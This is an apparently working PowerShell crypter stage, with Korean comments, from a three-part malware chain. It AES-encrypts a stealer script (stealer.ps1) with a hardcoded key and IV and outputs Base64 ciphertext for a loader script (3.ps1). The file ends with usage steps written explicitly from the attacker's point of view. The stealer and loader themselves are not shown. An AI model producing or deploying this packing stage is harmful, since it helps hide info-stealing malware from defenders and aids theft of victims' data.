<#
.SYNOPSIS
    '암호화 기계' 스크립트 (2.ps1)
.DESCRIPTION
    이 스크립트는 지정된 원본 PowerShell 스크립트(1.ps1[stealer.ps1])를 읽어들여,
    정의된 AES 키와 IV로 암호화.
    최종 결과물인 Base64 암호문은 콘솔에 출력되며, 공격자는 이 값을 복사하여
    최종 로더(Loader) 스크립트(3.ps1)에 붙여넣게 됨.
.NOTES
    실행 전, $sourceScriptPath 변수에 암호화할 원본 스크립트의 실제 경로를 정확히 입력해야 함.
#>

# --- 환경 설정 및 UTF-8 출력 인코딩 적용 ---
# 콘솔에서 한글 깨짐 방지
[Console]::OutputEncoding = [Text.Encoding]::UTF8

# 암호화할 원본 악성 스크립트 경로 (수정 필요)
$sourceScriptPath = ".\stealer.ps1"

# AES 키와 IV (Base64)
$KeyStr = "ZGFuZ2VyIG9mIHR5cG9zIQ=="  # "danger of typos!"
$IVStr  = "aGRmbGFiaGFoYXdlbGNvbWU="   # "hdflabhahawelcome"

try {
    # 1. 원본 파일 존재 여부 확인
    if (-not (Test-Path -Path $sourceScriptPath -PathType Leaf)) {
        throw "오류: 원본 스크립트 파일을 찾을 수 없습니다. 경로를 확인하세요: $sourceScriptPath"
    }

    # 2. Base64 → 바이트 배열 (괄호로 감싸기)
    $Key = ([Convert]::FromBase64String($KeyStr))[0..15]
    $IV  = ([Convert]::FromBase64String($IVStr))[0..15]

    # 3. AES 암호화 함수
    function EncryptStringAES {
        param(
            [string] $plainText,
            [byte[]] $key,
            [byte[]] $iv
        )
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key       = $key
        $aes.IV        = $iv
        $aes.Mode      = 'CBC'
        $aes.Padding   = 'PKCS7'

        $encryptor = $aes.CreateEncryptor()
        $bytes     = [System.Text.Encoding]::UTF8.GetBytes($plainText)
        $encBytes  = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
        [Convert]::ToBase64String($encBytes)
    }

    # 4. 파일 읽기 (인코딩 확인)
    Write-Host "[INFO] 원본 스크립트 파일을 읽는 중: $sourceScriptPath"
    $scriptContent = Get-Content -Path $sourceScriptPath -Raw -Encoding UTF8

    # 5. 암호화 수행
    Write-Host "[INFO] 스크립트 내용을 AES 방식으로 암호화하는 중..."
    $encryptedContent = EncryptStringAES -plainText $scriptContent -key $Key -iv $IV
    Write-Host "[SUCCESS] 암호화 완료!"

    # 6. 결과 출력
    Write-Host "------------------------------------------------------------------"
    Write-Host "아래의 암호화된 문자열을 복사하여 3.ps1 파일에 사용하세요:"
    Write-Host "------------------------------------------------------------------"
    Write-Host $encryptedContent -ForegroundColor Green
    Write-Host "------------------------------------------------------------------"
}
catch {
    Write-Host "[ERROR] 스크립트 실행 중 오류가 발생했습니다." -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
}

### 사용 방법 (공격자 입장)

# 1.  원본 악성 코드를 `stealer.ps1` 이라는 이름으로 저장.
# 2.  위의 `2.ps1` 스크립트를 `stealer.ps1`과 같은 폴더에 저장.
# 3.  PowerShell을 열어 `2.ps1` 스크립트를 실행.
# 4.  콘솔 화면에 초록색으로 나타나는 아주 긴 문자열을 복사.
# 5.  이 복사한 문자열을 가지고 이제 마지막 `3.ps1` 스크립트를 만들러 가면 됨.